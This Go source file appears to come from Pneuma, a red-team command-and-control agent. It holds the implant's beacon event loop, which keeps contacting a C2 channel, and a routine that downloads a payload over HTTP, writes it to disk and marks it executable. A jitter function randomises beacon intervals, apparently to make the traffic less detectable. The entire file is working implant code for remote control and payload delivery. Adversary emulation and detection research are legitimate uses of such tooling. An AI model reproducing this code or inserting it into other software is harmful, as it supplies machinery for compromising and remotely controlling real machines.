package sockets

import (
	"bytes"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"time"

	"github.com/preludeorg/pneuma/util"
)

func EventLoop(agent *util.AgentConfig, beacon util.Beacon) {
	respBeacon := util.CommunicationChannels[agent.Contact].Communicate(agent, beacon)
	refreshBeacon(agent, &respBeacon)
	log.Printf("C2 refreshed. [%s] agent at PID %d.", agent.Address, os.Getpid())
	EventLoop(agent, respBeacon)
}

func refreshBeacon(agent *util.AgentConfig, beacon *util.Beacon) {
	pwd, _ := os.Getwd()
	beacon.Sleep = agent.Sleep
	beacon.Range = agent.Range
	beacon.Pwd = pwd
	beacon.Target = agent.Address
}

func requestPayload(target string) string {
	var body []byte
	var filename string

	body, filename, _ = requestHTTPPayload(target)
	workingDir := "./"
	path := filepath.Join(workingDir, filename)
	util.SaveFile(bytes.NewReader(body), path)
	os.Chmod(path, 0755)
	return path
}


func jitterSleep(sleep int, beaconType string) {
	rand.Seed(time.Now().UnixNano())
	min := int(float64(sleep) * .90)
	max := int(float64(sleep) * 1.10)
	randomSleep := rand.Intn(max - min + 1) + min
	log.Printf("[%s] Next beacon going out in %d seconds", beaconType, randomSleep)
	time.Sleep(time.Duration(randomSleep) * time.Second)
}
